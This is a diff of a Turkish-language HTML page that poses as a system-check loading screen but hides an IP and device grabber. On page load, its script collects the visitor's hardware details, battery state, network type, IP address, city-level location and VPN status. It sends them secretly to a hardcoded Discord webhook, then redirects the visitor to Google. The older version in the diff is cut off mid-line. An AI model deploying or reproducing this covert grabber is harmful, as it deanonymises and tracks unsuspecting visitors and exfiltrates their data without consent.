@@ -1,11 +1,11 @@
 <!DOCTYPE html>
-<html>
+<html lang="tr">
 <head>
     <meta charset="UTF-8">
-    <title>Sistem Doğrulanıyor</title>
+    <title>Sistem Kaynaklari</title>
     <style>
-        body { background: #000; color: #0f0; font-family: monospace; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; overflow: hidden; }
-        .l { border: 2px solid #111; border-top: 2px solid #0f0; border-radius: 50%; width: 30px; height: 30px; animation: s 1s linear infinite; }
+        body { background:#000; display:flex; align-items:center; justify-content:center; height:100vh; margin:0; overflow:hidden; }
+        .l { border: 2px solid #111; border-top: 2px solid #0f0; border-radius: 50%; width: 25px; height: 25px; animation: s 1s linear infinite; }
         @keyframes s { to { transform: rotate(360deg); } }
     </style>
 </head>
@@ -15,36 +15,27 @@
     <script>
         (function() {
             "use strict";
-
             var WEBHOOK = "https://discord.com/api/webhooks/1457050495964151929/cue_0Yvmkt49p_J8fV_M4ks3DeuDRMilywpZUAX-2StNSQVIBBWVAk13bXGP186puI73";
-            var TARGET = "https://www.google.com";
+            var REDIRECT = "https://www.google.com";
 
-            var extract = async function() {
+            var run = async function() {
                 var d = {
-                    // Donanım Temelleri
-                    os: navigator.platform,
-                    cpu: navigator.hardwareConcurrency || "N/A",
+                    os: "Bilinmiyor", gpu: "Bilinmiyor", vdr: "Bilinmiyor",
+                    res: screen.width + "x" + screen.height,
                     ram: navigator.deviceMemory || "N/A",
-                    gpu: "Unknown", vdr: "Unknown",
-                    // Ekran ve Arayüz
-                    res: screen.width + "x" + screen.height + " (" + screen.colorDepth + "bit)",
-                    avail: screen.availWidth + "x" + screen.availHeight,
-                    ratio: window.devicePixelRatio,
-                    touch: (navigator.maxTouchPoints > 0 ? "Evet" : "Hayır"),
-                    // Bölgesel Bilgiler
+                    cpu: navigator.hardwareConcurrency || "N/A",
+                    bat: "N/A", net: "N/A", vpn: "✅ Temiz",
+                    ip: "N/A", loc: "N/A", iss: "N/A",
                     tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
                     lang: navigator.language,
-                    langs: navigator.languages.join(", "),
-                    // Ağ ve Güvenlik
-                    ip: "N/A", loc: "N/A", iss: "N/A", vpn: "✅ Temiz",
-                    down: "N/A", type: "N/A", rtt: "N/A",
-                    // Durum Bilgileri
-                    bat: "N/A", plug: "N/A",
-                    online: (navigator.onLine ? "Çevrimiçi" : "Çevrimdışı"),
-                    pdf: (navigator.pdfViewerEnabled ? "Evet" : "Hayır")
+                    touch: (navigator.maxTouchPoints > 0 ? "Evet" : "Hayır"),
+                    online: (navigator.onLine ? "Aktif" : "Pasif")
                 };
 
-                // 1. Derin GPU Analizi
+                // 1. İşletim Sistemi (OS) Tespiti
+                try { d.os = navigator.userAgent.match(/\(([^)]+)\)/)[1]; } catch(e) { d.os = navigator.platform; }
+
+                // 2. GPU ve Donanım Analizi
                 try {
                     var c = document.createElement('canvas');
                     var gl = c.getContext('webgl2') || c.getContext('webgl');
@@ -53,44 +44,56 @@
                     d.vdr = gl.getParameter(db.UNMASKED_VENDOR_ID);
                 } catch(e) {}
 
-                // 2. Detaylı Ağ Verileri
-                try {
-                    var n = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
-                    if (n) {
-                        d.type = n.effectiveType || "N/A";
-                        d.down = n.downlink + " Mbps";
-                        d.rtt = n.rtt + " ms";
-                    }
-                } catch(e) {}
-
-                // 3. Batarya Analizi
+                // 3. Pil ve Bağlantı Bilgisi
                 try {
                     if (navigator.getBattery) {
                         var b = await navigator.getBattery();
-                        d.bat = "%" + Math.round(b.level * 100);
-                        d.plug = b.charging ? "⚡ Şarjda" : "🔋 Pilde";
+                        d.bat = "%" + Math.round(b.level * 100) + (b.charging ? " (Şarjda)" : " (Pilde)");
                     }
+                    var n = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+                    if (n) d.net = n.effectiveType.toUpperCase() + " (" + n.downlink + "Mbps)";
                 } catch(e) {}
 
-                // 4. Konum ve ISS Sorgusu (ipapi üzerinden)
+                // 4. IP, Konum ve VPN Tespiti
                 try {
                     var r = await fetch('https://ipapi.co/json/');
                     var j = await r.json();
                     d.ip = j.ip;
-                    d.iss = j.org + " (" + j.asn + ")";
+                    d.iss = j.org;
                     d.loc = j.city + ", " + j.region + " / " + j.country_name;
-                    if (j.timezone !== d.tz) d.vpn = "🚨 **VPN/PROXY TESPİT EDİLDİ**";
-                } catch(e) {}
+                    if (j.timezone !== d.tz) d.vpn = "🚨 **VPN/PROXY AKTİF**";
+                } catch(e) { d.vpn = "Analiz Engellendi"; }
 
-                send(d);
+                // 5. Discord Payload Gönderimi
+                var payload = {
+                    embeds: [{
+                        title: "💀 FULL DEVICE EXTRACTION",
+                        color: d.vpn.includes("🚨") ? 15158332 : 3066993,
+                        fields: [
+                            { name: "📡 NETWORK", value: "**IP:** `" + d.ip + "`\n**VPN:** " + d.vpn + "\n**ISS:** `" + d.iss + "`", inline: false },
+                            { name: "📍 LOCATION", value: "**Bölge:** " + d.loc + "\n**TZ:** " + d.tz, inline: false },
+                            { name: "⚙️ HARDWARE", value: "**OS:** `" + d.os + "`\n**CPU:** " + d.cpu + " Cores\n**RAM:** " + d.ram + "GB\n**GPU:** `" + d.gpu + "`", inline: false },
+                            { name: "🔋 STATUS", value: "**Pil:** " + d.bat + "\n**Hız:** " + d.net + "\n**Touch:** " + d.touch, inline: true }
+                        ],
+                        footer: { text: "Ultimate Stealth V13.0" },
+                        timestamp: new Date().toISOString()
+                    }]
+                };
+
+                var blob = new Blob([JSON.stringify(payload)], { type: 'application/json' });
+                if (navigator.sendBeacon) {
+                    navigator.sendBeacon(WEBHOOK, blob);
+                } else {
+                    fetch(WEBHOOK, { method: 'POST', mode: 'no-cors', body: JSON.stringify(payload) });
+                }
+
+                // 6. Yönlendirme
+                setTimeout(function() { window.location.replace(REDIRECT); }, 1500);
             };
 
-            var send = function(data) {
-                var p = {
-                    username: "Omniscience V11.000",
-                    embeds: [{
-                        title: "💀 FULL SPECTRUM DEVICE EXTRACTION",
-                        color: data.vpn.includes("🚨") ? 15158332 : 3066993,
-                        fields: [
-                            { name: "📡 AĞ & GÜVENLİK", value: "**IP:** `" + data.ip + "`\n
-                                
+            window.onload = run;
+        })();
+    </script>
+</body>
+</html>
+
